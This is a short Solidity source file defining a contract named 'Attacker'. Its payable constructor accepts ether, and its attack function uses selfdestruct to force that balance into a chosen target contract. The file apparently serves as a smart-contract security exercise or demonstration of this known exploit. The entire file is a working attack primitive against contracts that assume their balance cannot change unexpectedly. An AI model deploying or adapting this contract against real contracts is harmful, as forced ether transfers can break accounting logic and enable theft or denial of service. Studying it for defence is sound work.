// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attacker {
    constructor() public payable  {}

    function attack(address target) external {
        selfdestruct(payable(target));
    }
}